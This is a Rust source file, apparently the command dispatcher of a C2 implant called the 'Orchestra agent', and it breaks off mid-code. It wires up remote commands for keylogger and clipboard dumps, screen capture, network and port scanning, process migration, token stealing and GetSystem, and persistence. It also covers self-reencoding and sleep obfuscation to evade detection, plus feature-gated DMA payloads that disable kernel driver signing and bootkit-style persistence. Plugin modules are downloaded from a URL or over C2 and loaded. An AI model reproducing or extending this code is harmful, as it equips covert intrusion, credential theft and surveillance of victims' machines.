//! Command dispatch and handler registry for the Orchestra agent.
//!
//! This module implements the central command-processing loop. Each variant of
//! [`Command`] is dispatched to the appropriate handler function. It also
//! manages shared mutable state for long-running operations:
//!
//! - **Pending module requests**: Tracks in-flight plugin load operations.
//! - **Shell sessions**: Manages interactive shell session lifetimes.
//! - **Loaded plugins**: Registry of dynamically loaded plugin modules.

use base64::Engine;
use common::lock::MutexExt;
use common::{
    config::Config, AuditEvent, Command, CryptoSession, Message, NetDiscoveryOp, Outcome,
};
use module_loader::LoadedPlugin;
use once_cell::sync::Lazy;
use std::collections::HashMap;
use std::path::Path;
use std::sync::{Arc, Mutex};
use std::time::Duration;
use sysinfo::System;
use tokio::sync::Mutex as TokioMutex;

use super::fsops;

// Pending module-download requests.  When the `DownloadModule` handler
// sends a `ModuleRequest` through the C2 channel, it inserts a oneshot
// sender keyed by `module_id`.  When the corresponding `ModuleResponse`
// arrives in the main loop, the oneshot is completed with the encrypted
// blob, unblocking the handler.
pub static PENDING_MODULE_REQUESTS: Lazy<
    Mutex<HashMap<String, tokio::sync::oneshot::Sender<Vec<u8>>>>,
> = Lazy::new(|| Mutex::new(HashMap::new()));

/// Reject any module identifier that contains characters outside the
/// safe alphabet. Prevents path traversal via the `DeployModule`
/// command (e.g. `../../etc/passwd`).
pub(crate) fn is_valid_module_id(id: &str) -> bool {
    !id.is_empty()
        && id.len() <= 128
        && id
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
}

/// Tracks the state of an asynchronous plugin job.
struct PluginJob {
    /// The plugin that owns this job.
    plugin_id: String,
    /// Current status of the job.
    status: String, // "running", "completed", "failed"
    /// Output data, if available.
    output: Option<String>,
}

static LOADED_PLUGINS: Lazy<Mutex<HashMap<String, LoadedPlugin>>> =
    Lazy::new(|| Mutex::new(HashMap::new()));
pub static SHUTDOWN_NOTIFY: Lazy<Arc<tokio::sync::Notify>> =
    Lazy::new(|| Arc::new(tokio::sync::Notify::new()));
/// Registry of asynchronous plugin jobs keyed by job ID.
static PLUGIN_JOBS: Lazy<Mutex<HashMap<String, PluginJob>>> =
    Lazy::new(|| Mutex::new(HashMap::new()));

#[cfg(all(windows, feature = "forensic-cleanup"))]
static SESSION_START_TIME: Lazy<std::time::SystemTime> = Lazy::new(std::time::SystemTime::now);

#[cfg(all(windows, feature = "forensic-cleanup"))]
fn to_nt_wide_path(path: &str) -> Vec<u16> {
    if path.starts_with('\\') {
        path.encode_utf16().chain(std::iter::once(0)).collect()
    } else {
        format!("\\??\\{path}")
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect()
    }
}

/// Parse a TCC resource name string into a `crate::macos_postexp::TccResource`.
/// Returns a sensible default (FullDiskAccess) for unrecognised strings.
#[cfg(all(target_os = "macos", feature = "macos-postexp"))]
fn parse_tcc_resource(name: &str) -> crate::macos_postexp::TccResource {
    match name {
        "Camera" => crate::macos_postexp::TccResource::Camera,
        "Microphone" => crate::macos_postexp::TccResource::Microphone,
        "ScreenRecording" => crate::macos_postexp::TccResource::ScreenRecording,
        "FullDiskAccess" => crate::macos_postexp::TccResource::FullDiskAccess,
        "DesktopFolder" => crate::macos_postexp::TccResource::DesktopFolder,
        "DocumentsFolder" => crate::macos_postexp::TccResource::DocumentsFolder,
        "DownloadsFolder" => crate::macos_postexp::TccResource::DownloadsFolder,
        "Contacts" => crate::macos_postexp::TccResource::Contacts,
        "Calendar" => crate::macos_postexp::TccResource::Calendar,
        "Reminders" => crate::macos_postexp::TccResource::Reminders,
        "Photos" => crate::macos_postexp::TccResource::Photos,
        "Accessibility" => crate::macos_postexp::TccResource::Accessibility,
        "PostEvent" => crate::macos_postexp::TccResource::PostEvent,
        _ => crate::macos_postexp::TccResource::FullDiskAccess,
    }
}

/// Parse a DMA payload type string into a `crate::hardware_persistence::DmaPayloadType`.
#[cfg(feature = "hardware-persistence")]
fn parse_dma_payload_type(
    name: &str,
) -> Result<crate::hardware_persistence::thunderbolt_dma::DmaPayloadType, String> {
    use crate::hardware_persistence::thunderbolt_dma::DmaPayloadType;
    match name {
        "KernelDseDisable" => Ok(DmaPayloadType::KernelDseDisable),
        "ProcessInjection" => Ok(DmaPayloadType::ProcessInjection),
        "CodeIntegrityPatch" => Ok(DmaPayloadType::CodeIntegrityPatch),
        "KernelCallbackInstall" => Ok(DmaPayloadType::KernelCallbackInstall),
        "Raw" => Ok(DmaPayloadType::Raw),
        _ => Err(format!(
            "Unknown DMA payload type: '{}'. Use KernelDseDisable, ProcessInjection, CodeIntegrityPatch, KernelCallbackInstall, or Raw.",
            name
        )),
    }
}

/// Parse a persistence artifact type string into a `crate::hardware_persistence::boot_persistence::PersistenceArtifactType`.
#[cfg(feature = "hardware-persistence")]
fn parse_persistence_artifact_type(
    name: &str,
) -> crate::hardware_persistence::boot_persistence::PersistenceArtifactType {
    use crate::hardware_persistence::boot_persistence::PersistenceArtifactType;
    match name {
        "VbrModification" => PersistenceArtifactType::VbrModification,
        "MbrModification" => PersistenceArtifactType::MbrModification,
        "EfiBootEntry" => PersistenceArtifactType::EfiBootEntry,
        "UnsignedUefiDriver" => PersistenceArtifactType::UnsignedUefiDriver,
        "NvramBootOrderModification" => PersistenceArtifactType::NvramBootOrderModification,
        "HiddenSectorPayload" => PersistenceArtifactType::HiddenSectorPayload,
        _ => PersistenceArtifactType::EfiBootEntry,
    }
}

#[cfg(all(windows, feature = "forensic-cleanup"))]
fn collect_recent_files_for_sync(
    roots: &[String],
    since: std::time::SystemTime,
    max_files: usize,
) -> Result<Vec<String>, String> {
    const MAX_DIR_VISITS: usize = 50_000;

    let mut queue = std::collections::VecDeque::new();
    for root in roots {
        if !root.trim().is_empty() {
            queue.push_back(std::path::PathBuf::from(root));
        }
    }

    let mut dir_visits = 0usize;
    let mut files = Vec::new();

    while let Some(path) = queue.pop_front() {
        if files.len() >= max_files {
            break;
        }

        let meta = match std::fs::symlink_metadata(&path) {
            Ok(m) => m,
            Err(_) => continue,
        };

        let file_type = meta.file_type();
        if file_type.is_symlink() {
            continue;
        }

        if meta.is_dir() {
            dir_visits += 1;
            if dir_visits > MAX_DIR_VISITS {
                break;
            }

            let read_dir = match std::fs::read_dir(&path) {
                Ok(rd) => rd,
                Err(_) => continue,
            };
            for entry in read_dir.flatten() {
                queue.push_back(entry.path());
            }
            continue;
        }

        if !meta.is_file() {
            continue;
        }

        let is_recent = match meta.modified() {
            Ok(modified) => modified.duration_since(since).is_ok(),
            Err(_) => false,
        };

        if is_recent {
            files.push(path.to_string_lossy().to_string());
        }
    }

    files.sort_unstable();
    files.dedup();
    if files.len() > max_files {
        files.truncate(max_files);
    }
    Ok(files)
}

fn sanitize_action(cmd: &Command) -> String {
    match cmd {
        Command::WriteFile { path, .. } => format!("WriteFile(path={path:?})"),
        Command::ShellInput { session_id, .. } => format!("ShellInput(session={session_id})"),
        Command::ReadFile { path } => format!("ReadFile(path={path:?})"),
        other => format!("{other:?}"),
    }
}

/// Sanitize the result string before it appears in the audit log.
///
/// Successful `ReadFile` and `CaptureScreen` results contain base64-encoded
/// file/screen data.  Logging that verbatim would write potentially sensitive
/// content to the audit trail (contradicting the claim in
/// `SECURITY_AUDIT.md §8`).  Replace those payloads with a size summary.
fn sanitize_result(cmd: &Command, result: &Result<String, String>) -> String {
    match (cmd, result) {
        (Command::ReadFile { .. }, Ok(b64)) => {
            format!("[file content redacted, {} base64 bytes]", b64.len())
        }
        (Command::CaptureScreen, Ok(b64)) => {
            format!("[screenshot redacted, {} base64 bytes]", b64.len())
        }
        (Command::Screenshot { .. }, Ok(msg)) => msg.clone(),
        (Command::KeyloggerDump { .. }, Ok(msg)) => msg.clone(),
        (Command::ClipboardMonitorDump { .. }, Ok(msg)) => msg.clone(),
        (_, Ok(s)) => s.clone(),
        (_, Err(e)) => e.clone(),
    }
}

pub(crate) fn make_audit(
    action: &str,
    outcome: Outcome,
    details: &str,
    operator_id: &str,
) -> AuditEvent {
    let agent_id = System::host_name().unwrap_or_else(|| "unknown".to_string());
    AuditEvent::new(&agent_id, operator_id, action, details, outcome)
}

/// Handle a server-initiated module push: decrypt, verify signature (when the
/// `module-signatures` feature is active), and register the loaded plugin.
///
/// The module name must pass the same validation applied to `DeployModule` to
/// prevent a malicious server from injecting arbitrary plugin IDs.
pub(crate) fn push_module(
    module_name: String,
    encrypted_blob: &[u8],
    crypto: &CryptoSession,
    verify_key: Option<&str>,
) -> Result<String, String> {
    if !is_valid_module_id(&module_name) {
        return Err(format!(
            "ModulePush rejected: invalid module_name '{}' (allowed: [a-zA-Z0-9_-]{{1,128}})",
            module_name
        ));
    }
    match module_loader::load_plugin(encrypted_blob, crypto, verify_key) {
        Ok(plugin) => {
            let metadata = plugin
                .get_metadata()
                .unwrap_or_else(|| module_loader::PluginMetadata::default_for(&module_name));
            let load_timestamp = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs();
            LOADED_PLUGINS.lock_recover().insert(
                module_name.clone(),
                LoadedPlugin {
                    plugin: Arc::new(plugin),
                    metadata,
                    load_timestamp,
                },
            );
            Ok(format!("Module '{}' loaded via push", module_name))
        }
        Err(e) => Err(e.to_string()),
    }
}

pub async fn handle_command(
    crypto: Arc<CryptoSession>,
    config: Arc<TokioMutex<Config>>,
    command: Command,
    operator_id: &str,
    out_tx: tokio::sync::mpsc::Sender<Message>,
    p2p_mesh: Arc<tokio::sync::Mutex<crate::p2p::P2pMesh>>,
) -> (Result<String, String>, Option<Vec<u8>>, AuditEvent) {
    let action = sanitize_action(&command);

    let mut result_data: Option<Vec<u8>> = None;
    // Match on a cloned command so feature-gated branches can destructure
    // owned fields without invalidating later audit/sanitization paths that
    // still need to borrow `command`.
    let result: Result<String, String> = match command.clone() {
        Command::Ping => Ok("pong".to_string()),
        Command::GetSystemInfo => handle_system_info(),
        Command::RunApprovedScript { ref script } => handle_run_approved_script(script),

        Command::ListDirectory { ref path } => {
            let cfg = config.lock().await.clone();
            match fsops::list_directory(path, &cfg).await {
                Ok(entries) => Ok(serde_json::to_string(&entries).unwrap_or_default()),
                Err(e) => Err(e.to_string()),
            }
        }

        Command::ReadFile { ref path } => {
            let cfg = config.lock().await.clone();
            match fsops::read_file(path, &cfg).await {
                Ok(content) => Ok(base64::engine::general_purpose::STANDARD.encode(&content)),
                Err(e) => Err(e.to_string()),
            }
        }

        Command::WriteFile {
            ref path,
            ref content,
        } => {
            let cfg = config.lock().await.clone();
            match fsops::write_file(path, content, &cfg).await {
                Ok(_) => Ok("success".to_string()),
                Err(e) => Err(e.to_string()),
            }
        }

        #[cfg(feature = "network-discovery")]
        Command::DiscoverNetwork => {
            let cfg = config.lock().await.clone();
            let hosts = super::net_discovery::arp_scan().unwrap_or_default();
            // `arp_scan` reads the local ARP cache — it shows hosts this
            // machine has recently communicated with.  For a proactive sweep
            // of a subnet, use `ping_sweep` with an explicit CIDR configured
            // via `port_scan_concurrency` / `port_scan_timeout_ms` in agent.toml.
            Ok(serde_json::json!({
                "arp_hosts": hosts,
                "scan_config": {
                    "concurrency": cfg.port_scan_concurrency,
                    "timeout_ms": cfg.port_scan_timeout_ms,
                },
                "note": "arp_hosts reflects the local ARP cache only; \
                         to probe a subnet proactively use the PortScan handler."
            })
            .to_string())
        }
        #[cfg(not(feature = "network-discovery"))]
        Command::DiscoverNetwork => Err("network-discovery feature not enabled".to_string()),

        // ── Extended network discovery (P3-01) ──
        #[cfg(feature = "network-discovery")]
        Command::NetworkDiscovery { ref operation } => {
            use std::net::IpAddr;
            match operation {
                NetDiscoveryOp::ArpScan => match super::net_discovery::arp_scan() {
                    Ok(hosts) => serde_json::to_string(&hosts).map_err(|e| e.to_string()),
                    Err(e) => Err(e),
                },
                NetDiscoveryOp::PingSweep {
                    subnet,
                    timeout_ms,
                    max_concurrent,
                } => {
                    match super::net_discovery::ping_sweep(
                        subnet,
                        Duration::from_millis(*timeout_ms),
                        *max_concurrent,
                    )
                    .await
                    {
                        Ok(hosts) => serde_json::to_string(&hosts).map_err(|e| e.to_string()),
                        Err(e) => Err(e),
                    }
                }
                NetDiscoveryOp::TcpPortScan {
                    host,
                    ports,
                    concurrency,
                    timeout_ms,
                } => match host.parse::<IpAddr>() {
                    Ok(ip) => match super::net_discovery::tcp_port_scan(
                        ip,
                        ports,
                        *concurrency,
                        Duration::from_millis(*timeout_ms),
                    )
                    .await
                    {
                        Ok(open_ports) => {
                            serde_json::to_string(&open_ports).map_err(|e| e.to_string())
                        }
                        Err(e) => Err(e),
                    },
                    Err(e) => Err(format!("invalid IP address '{}': {}", host, e)),
                },
                NetDiscoveryOp::ReverseDns { ip } => match ip.parse::<IpAddr>() {
                    Ok(addr) => match super::net_discovery::reverse_dns_lookup(addr) {
                        Ok(hostname) => serde_json::to_string(&hostname).map_err(|e| e.to_string()),
                        Err(e) => Err(e),
                    },
                    Err(e) => Err(format!("invalid IP address '{}': {}", ip, e)),
                },
                NetDiscoveryOp::AdSrvDiscovery { domain } => {
                    match super::net_discovery::ad_srv_discovery(domain) {
                        Ok(records) => serde_json::to_string(&records).map_err(|e| e.to_string()),
                        Err(e) => Err(e),
                    }
                }
            }
        }
        #[cfg(not(feature = "network-discovery"))]
        Command::NetworkDiscovery { .. } => {
            Err("network-discovery feature not enabled".to_string())
        }

        #[cfg(feature = "remote-assist")]
        Command::CaptureScreen => match super::remote_assist::capture_screen() {
            Ok(data) => Ok(base64::engine::general_purpose::STANDARD.encode(&data)),
            Err(e) => Err(e.to_string()),
        },
        #[cfg(not(feature = "remote-assist"))]
        Command::CaptureScreen => Err("remote-assist feature not enabled".to_string()),

        #[cfg(feature = "remote-assist")]
        Command::SimulateKey { ref key } => super::remote_assist::simulate_key(key)
            .map(|_| "success".to_string())
            .map_err(|e| e.to_string()),
        #[cfg(not(feature = "remote-assist"))]
        Command::SimulateKey { .. } => Err("remote-assist feature not enabled".to_string()),

        #[cfg(feature = "remote-assist")]
        Command::SimulateMouse { x, y } => super::remote_assist::simulate_mouse_move(x, y)
            .map(|_| "success".to_string())
            .map_err(|e| e.to_string()),
        #[cfg(not(feature = "remote-assist"))]
        Command::SimulateMouse { .. } => Err("remote-assist feature not enabled".to_string()),

        #[cfg(feature = "hci-research")]
        Command::StartHciLogging => {
            super::hci_logging::start_logging().map(|_| "success".to_string())
        }
        #[cfg(not(feature = "hci-research"))]
        Command::StartHciLogging => Err("hci-research feature not enabled".to_string()),

        #[cfg(feature = "hci-research")]
        Command::StopHciLogging => {
            super::hci_logging::stop_logging().map(|_| "success".to_string())
        }
        #[cfg(not(feature = "hci-research"))]
        Command::StopHciLogging => Err("hci-research feature not enabled".to_string()),

        #[cfg(feature = "hci-research")]
        Command::GetHciLogBuffer => match super::hci_logging::get_log_buffer() {
            Ok(buffer) => serde_json::to_string(&buffer).map_err(|e| e.to_string()),
            Err(e) => Err(e),
        },
        #[cfg(not(feature = "hci-research"))]
        Command::GetHciLogBuffer => Err("hci-research feature not enabled".to_string()),

        Command::DeployModule { ref module_id } => {
            if !is_valid_module_id(module_id) {
                Err("Invalid module_id (allowed: [a-zA-Z0-9_-]{1,128})".to_string())
            } else {
                let cfg = config.lock().await.clone();
                let path = Path::new(&cfg.module_cache_dir).join(format!(
                    "{}.{}",
                    module_id,
                    std::env::consts::DLL_EXTENSION
                ));
                let path_str = path.to_string_lossy().into_owned();
                match fsops::read_file(&path_str, &cfg).await {
                    Err(e) => Err(format!("Failed to read module blob: {e}")),
                    Ok(blob) => match module_loader::load_plugin(
                        &blob,
                        &crypto,
                        cfg.module_verify_key.as_deref(),
                    ) {
                        Ok(plugin) => {
                            let metadata = plugin.get_metadata().unwrap_or_else(|| {
                                module_loader::PluginMetadata::default_for(module_id)
                            });
                            let load_timestamp = std::time::SystemTime::now()
                                .duration_since(std::time::UNIX_EPOCH)
                                .unwrap_or_default()
                                .as_secs();
                            LOADED_PLUGINS.lock_recover().insert(
                                module_id.clone(),
                                LoadedPlugin {
                                    plugin: Arc::new(plugin),
                                    metadata,
                                    load_timestamp,
                                },
                            );
                            Ok("Module deployed".to_string())
                        }
                        Err(e) => Err(e.to_string()),
                    },
                }
            }
        }

        Command::ExecutePlugin {
            ref plugin_id,
            ref args,
        } => {
            // Clone the Arc while holding the lock, then release the lock
            // before calling execute() so other plugin operations are not
            // serialised behind a long-running plugin execution.
            let maybe_plugin = {
                let plugins = LOADED_PLUGINS.lock_recover();
                plugins.get(plugin_id).map(|lp| lp.plugin.clone())
            };
            match maybe_plugin {
                Some(plugin) => match (**plugin).execute(args) {
                    Ok(result) => {
                        // Check for async job marker.
                        if let Some(rest) = result.strip_prefix("__ASYNC_JOB__:") {
                            let job_id = rest.to_string();
                            PLUGIN_JOBS.lock_recover().insert(
                                job_id.clone(),
                                PluginJob {
                                    plugin_id: plugin_id.clone(),
                                    status: "running".to_string(),
                                    output: None,
                                },
                            );
                            Ok(format!("Job started: {job_id}"))
                        } else {
                            Ok(result)
                        }
                    }
                    Err(e) => Err(e.to_string()),
                },
                None => Err(format!("Plugin '{plugin_id}' not loaded")),
            }
        }

        Command::ReloadConfig => match crate::config::load_config() {
            Ok(new_cfg) => {
                let mut cfg = config.lock().await;
                *cfg = new_cfg;
                Ok("Configuration reloaded".to_string())
            }
            Err(e) => Err(e.to_string()),
        },

        Command::ListProcesses => {
            let procs = crate::process_manager::list_processes();
            serde_json::to_string(&procs).map_err(|e| e.to_string())
        }

        Command::MigrateAgent { target_pid } => {
            if target_pid == 0 {
                Err("invalid target PID: 0".to_string())
            } else {
                let current_pid = std::process::id();
                if target_pid == current_pid {
                    Err("cannot migrate to self".to_string())
                } else if target_pid == 4 {
                    Err("cannot migrate to System process".to_string())
                } else {
                    crate::process_manager::migrate_to_process(target_pid)
                        .map(|_| "Migration completed".to_string())
                        .map_err(|e| e.to_string())
                }
            }
        }

        #[cfg(feature = "self-reencode")]
        Command::SetReencodeSeed { seed } => {
            crate::self_reencode::set_seed(seed);
            tracing::info!("self-reencode seed updated to {seed:#018x}");
            Ok(format!("Re-encode seed set to {seed:#018x}"))
        }
        #[cfg(not(feature = "self-reencode"))]
        Command::SetReencodeSeed { .. } => Err("self-reencode feature not enabled".to_string()),

        // MorphNow: immediately re-encode .text with the supplied seed and
        // return the SHA-256 hash of the resulting .text section.
        #[cfg(feature = "self-reencode")]
        Command::MorphNow { seed } => match crate::self_reencode::morph_now(seed) {
            Ok(hash) => {
                tracing::info!("MorphNow completed: .text hash = {hash}");
                Ok(hash)
            }
            Err(e) => {
                tracing::error!("MorphNow failed: {e:#}");
                Err(format!("MorphNow failed: {e:#}"))
            }
        },
        #[cfg(not(feature = "self-reencode"))]
        Command::MorphNow { .. } => Err("self-reencode feature not enabled".to_string()),

        // SetSleepVariant: switch the sleep obfuscation variant at runtime.
        // Accepted values: "cronus", "ekko".
        #[cfg(windows)]
        Command::SetSleepVariant { ref variant } => match variant.to_lowercase().as_str() {
            "cronus" => {
                crate::sleep_obfuscation::set_sleep_variant(
                    crate::sleep_obfuscation::SleepVariant::Cronus,
                );
                Ok(format!("Sleep variant set to {variant}"))
            }
            "ekko" => {
                crate::sleep_obfuscation::set_sleep_variant(
                    crate::sleep_obfuscation::SleepVariant::Ekko,
                );
                Ok(format!("Sleep variant set to {variant}"))
            }
            other => {
                tracing::warn!("unknown sleep variant '{other}', ignoring");
                Err(format!("unknown sleep variant: {other}"))
            }
        },
        #[cfg(not(windows))]
        Command::SetSleepVariant { .. } => {
            Err("sleep obfuscation variant switching is only supported on Windows".to_string())
        }

        #[cfg(feature = "persistence")]
        Command::EnablePersistence => crate::persistence::install_persistence()
            .map(|p| format!("Persistence installed at {}", p.display()))
            .map_err(|e| e.to_string()),
        #[cfg(not(feature = "persistence"))]
        Command::EnablePersistence => Err("persistence feature not enabled".to_string()),

        #[cfg(feature = "persistence")]
        Command::DisablePersistence => crate::persistence::uninstall_persistence()
            .map(|_| "Persistence removed".to_string())
            .map_err(|e| e.to_string()),
        #[cfg(not(feature = "persistence"))]
        Command::DisablePersistence => Err("persistence feature not enabled".to_string()),

        // ── Plugin Framework commands ──
        Command::ListPlugins => {
            // Clone metadata under the lock, then release before
            // serialising so other plugin commands are not blocked.
            let meta_list: Vec<_> = {
                let plugins = LOADED_PLUGINS.lock_recover();
                plugins.values().map(|lp| lp.metadata.clone()).collect()
            };
            serde_json::to_string(&meta_list).map_err(|e| e.to_string())
        }

        Command::UnloadPlugin { ref plugin_id } => {
            let removed = LOADED_PLUGINS.lock_recover().remove(plugin_id);
            // Dropping the LoadedPlugin drops the inner Arc<Box<dyn Plugin>>,
            // which triggers destroy via the FfiPlugin Drop implementation.
            if removed.is_some() {
                Ok(format!("Plugin '{plugin_id}' unloaded"))
            } else {
                Err(format!("Plugin '{plugin_id}' not loaded"))
            }
        }

        Command::GetPluginInfo { ref plugin_id } => {
            // Clone metadata under the lock, then release before
            // serialising so other plugin commands are not blocked.
            let maybe_meta = {
                let plugins = LOADED_PLUGINS.lock_recover();
                plugins.get(plugin_id).map(|lp| lp.metadata.clone())
            };
            match maybe_meta {
                Some(meta) => serde_json::to_string(&meta).map_err(|e| e.to_string()),
                None => Err(format!("Plugin '{plugin_id}' not loaded")),
            }
        }

        Command::DownloadModule {
            ref module_id,
            ref repo_url,
        } => {
            if !is_valid_module_id(module_id) {
                Err("Invalid module_id (allowed: [a-zA-Z0-9_-]{1,128})".to_string())
            } else {
                // ── DownloadModule ────────────────────────────────────
                // Three resolution paths, in priority order:
                //   1. repo_url supplied → direct HTTP(S) download, cache, load
                //   2. no repo_url, module already cached → load from cache
                //   3. no repo_url, not cached → C2-tunneled request (with timeout)

                let cfg = config.lock().await.clone();
                let cache_path = std::path::Path::new(&cfg.module_cache_dir).join(format!(
                    "{}.{}",
                    module_id,
                    std::env::consts::DLL_EXTENSION
                ));

                // ── Path 1: Direct HTTP(S) download from repo_url ─────
                if let Some(ref url) = repo_url {
                    let full_url = if url.ends_with('/') {
                        format!("{}{}.{}",
                            url, module_id, std::env::consts::DLL_EXTENSION)
                    } else {
                        format!("{}/{}.{}",
                            url, module_id, std::env::consts::DLL_EXTENSION)
                    };

                    tracing::info!("DownloadModule: fetching from {full_url}");

                    let response = match reqwest::get(&full_url).await {
                        Ok(r) => r,
                        Err(e) => {
                            return (
                                Err(format!("HTTP download from '{url}' failed: {e}")),
                                None,
                                make_audit(&action, Outcome::Failure,
                                    &format!("HTTP download failed: {e}"), operator_id),
                            );
                        }
                    };

                    if !response.status().is_success() {
                        let status = response.status();
                        return (
                            Err(format!("HTTP download from '{url}' returned {status}")),
                            None,
                            make_audit(&action, Outcome::Failure,
                                &format!("HTTP {status}"), operator_id),
                        );
                    }

                    let blob = match response.bytes().await {
                        Ok(b) => b.to_vec(),
                        Err(e) => {
                            return (
                                Err(format!("Failed to read HTTP response body: {e}")),
                                None,
                                make_audit(&action, Outcome::Failure,
                                    &format!("HTTP body read failed: {e}"), operator_id),
                            );
                        }
                    };

                    if blob.is_empty() {
                        return (
                            Err(format!("Module '{module_id}' download returned empty body from '{url}'")),
                            None,
                            make_audit(&action, Outcome::Failure,
                                "empty HTTP response body", operator_id),
                        );
                    }

                    // Cache the downloaded blob for future use.
                    if let Err(e) = fsops::write_file(
                        &cache_path.to_string_lossy(), &blob, &cfg,
                    ).await {
                        tracing::warn!(
                            "DownloadModule: failed to cache module to {}: {e}",
                            cache_path.display()
                        );
                    }

                    match module_loader::load_plugin(
                        &blob, &crypto, cfg.module_verify_key.as_deref(),
                    ) {
                        Ok(plugin) => {
                            let metadata = plugin.get_metadata().unwrap_or_else(|| {
                                module_loader::PluginMetadata::default_for(module_id)
                            });
                            let load_timestamp = std::time::SystemTime::now()
                                .duration_since(std::time::UNIX_EPOCH)
                                .unwrap_or_default()
                                .as_secs();
                            LOADED_PLUGINS.lock_recover().insert(
                                module_id.clone(),
                                LoadedPlugin {
                                    plugin: Arc::new(plugin),
                                    metadata,
                                    load_timestamp,
                                },
                            );
                            Ok(format!("Module '{module_id}' downloaded from repo and loaded"))
                        }
                        Err(e) => Err(format!("Module load failed: {e}")),
                    }
                } else {
                    // ── Path 2: Check local cache ─────────────────────
                    let cached = fsops::read_file(
                        &cache_path.to_string_lossy(), &cfg,
                    ).await.ok();

                    if let Some(blob) = cached {
                        tracing::info!(
                            "DownloadModule: loading '{}' from cache at {}",
                            module_id, cache_path.display()
                        );
                        match module_loader::load_plugin(
                            &blob, &crypto, cfg.module_verify_key.as_deref(),
                        ) {
                            Ok(plugin) => {
                                let metadata = plugin.get_metadata().unwrap_or_else(|| {
                                    module_loader::PluginMetadata::default_for(module_id)
                                });
                                let load_timestamp = std::time::SystemTime::now()
                                    .duration_since(std::time::UNIX_EPOCH)
                                    .unwrap_or_default()
                                    .as_secs();
                                LOADED_PLUGINS.lock_recover().insert(
                                    module_id.clone(),
                                    LoadedPlugin {
                                        plugin: Arc::new(plugin),
                                        metadata,
                                        load_timestamp,
                                    },
                                );
                                Ok(format!("Module '{module_id}' loaded from cache"))
                            }
                            Err(e) => Err(format!("Cached module load failed: {e}")),
                        }
                    } else {
                        // ── Path 3: C2-tunneled module download ───────
                        // Send a ModuleRequest through the outbound C2
                        // channel and wait for the server's ModuleResponse
                        // via a oneshot.  A timeout prevents indefinite
                        // hangs if the server never responds.
                        drop(cfg); // release config lock before awaiting

                        let (tx, rx) = tokio::sync::oneshot::channel::<Vec<u8>>();
                        {
                            let mut pending = PENDING_MODULE_REQUESTS.lock_recover();
                            pending.insert(module_id.clone(), tx);
                        }

                        let req = Message::ModuleRequest {
                            module_id: module_id.clone(),
                        };
                        if let Err(e) = out_tx.send(req).await {
                            PENDING_MODULE_REQUESTS.lock_recover().remove(module_id);
                            return (
                                Err(format!("Failed to send ModuleRequest: {e}")),
                                None,
                                make_audit(&action, Outcome::Failure,
                                    &e.to_string(), operator_id),
                            );
                        }

                        // Wait for the server's ModuleResponse with a
                        // bounded timeout so the handler cannot hang
                        // indefinitely if the server drops the request.
                        const MODULE_DOWNLOAD_TIMEOUT: std::time::Duration =
                            std::time::Duration::from_secs(60);

                        match tokio::time::timeout(MODULE_DOWNLOAD_TIMEOUT, rx).await {
                            Ok(Ok(encrypted_blob)) => {
                                if encrypted_blob.is_empty() {
                                    return (
                                        Err(format!("Module '{module_id}' not found on server")),
                                        None,
                                        make_audit(&action, Outcome::Failure,
                                            "server returned empty module", operator_id),
                                    );
                                }

                                // Cache the encrypted blob for future use.
                                let cfg = config.lock().await.clone();
                                if let Err(e) = fsops::write_file(
                                    &cache_path.to_string_lossy(),
                                    &encrypted_blob, &cfg,
                                ).await {
                                    tracing::warn!(
                                        "DownloadModule: failed to cache module: {e}"
                                    );
                                }

                                match module_loader::load_plugin(
                                    &encrypted_blob, &crypto,
                                    cfg.module_verify_key.as_deref(),
                                ) {
                                    Ok(plugin) => {
                                        let metadata = plugin.get_metadata().unwrap_or_else(|| {
                                            module_loader::PluginMetadata::default_for(module_id)
                                        });
                                        let load_timestamp = std::time::SystemTime::now()
                                            .duration_since(std::time::UNIX_EPOCH)
                                            .unwrap_or_default()
                                            .as_secs();
                                        LOADED_PLUGINS.lock_recover().insert(
                                            module_id.clone(),
                                            LoadedPlugin {
                                                plugin: Arc::new(plugin),
                                                metadata,
                                                load_timestamp,
                                            },
                                        );
                                        Ok(format!("Module '{module_id}' downloaded via C2 and loaded"))
                                    }
                                    Err(e) => Err(format!("Module load failed: {e}")),
                                }
                            }
                            Ok(Err(_)) => Err(format!(
                                "ModuleRequest for '{module_id}' cancelled — channel closed"
                            )),
                            Err(_) => {
                                // Timeout — remove stale pending entry.
                                PENDING_MODULE_REQUESTS.lock_recover().remove(module_id);
                                Err(format!(
                                    "ModuleRequest for '{module_id}' timed out after {}s",
                                    MODULE_DOWNLOAD_TIMEOUT.as_secs()
                                ))
                            }
                        }
                    }
                }
            }
        }

        Command::ExecutePluginBinary {
            ref plugin_id,
            ref input_data,
        } => {
            let maybe_plugin = {
                let plugins = LOADED_PLUGINS.lock_recover();
                plugins.get(plugin_id).map(|lp| lp.plugin.clone())
            };
            match maybe_plugin {
                Some(plugin) => match (**plugin).execute_binary(input_data) {
                    Ok(output) => {
                        let len = output.len();
                        result_data = Some(output);
                        Ok(format!("Binary result: {} bytes", len))
                    }
                    Err(e) => Err(e.to_string()),
                },
                None => Err(format!("Plugin '{plugin_id}' not loaded")),
            }
        }

        Command::JobStatus { ref job_id } => {
            let jobs = PLUGIN_JOBS.lock_recover();
            match jobs.get(job_id) {
                Some(job) => {
                    let info = serde_json::json!({
                        "job_id": job_id,
                        "plugin_id": job.plugin_id,
                        "status": job.status,
                        "output": job.output,
                    });
                    Ok(info.to_string())
                }
                None => Err(format!("Job '{job_id}' not found")),
            }
        }

        Command::Shutdown => {
            SHUTDOWN_NOTIFY.notify_one();
            Ok("Agent shutdown sequence initiated".to_string())
        }

        // ── Token Manipulation (Windows only) ─────────────────────────
        #[cfg(windows)]
        Command::MakeToken {
            ref username,
            ref password,
            ref domain,
            logon_type,
        } => super::token_manipulation::make_token(username, password, domain, logon_type)
            .map_err(|e| e.to_string()),
        #[cfg(not(windows))]
        Command::MakeToken { .. } => Err("token manipulation requires Windows".to_string()),

        #[cfg(windows)]
        Command::StealToken { target_pid } => {
            super::token_manipulation::steal_token(target_pid).map_err(|e| e.to_string())
        }
        #[cfg(not(windows))]
        Command::StealToken { .. } => Err("token manipulation requires Windows".to_string()),

        #[cfg(windows)]
        Command::Rev2Self => super::token_manipulation::rev2self().map_err(|e| e.to_string()),
        #[cfg(not(windows))]
        Command::Rev2Self => Err("token manipulation requires Windows".to_string()),

        #[cfg(windows)]
        Command::GetSystem => super::token_manipulation::get_system().map_err(|e| e.to_string()),
        #[cfg(not(windows))]
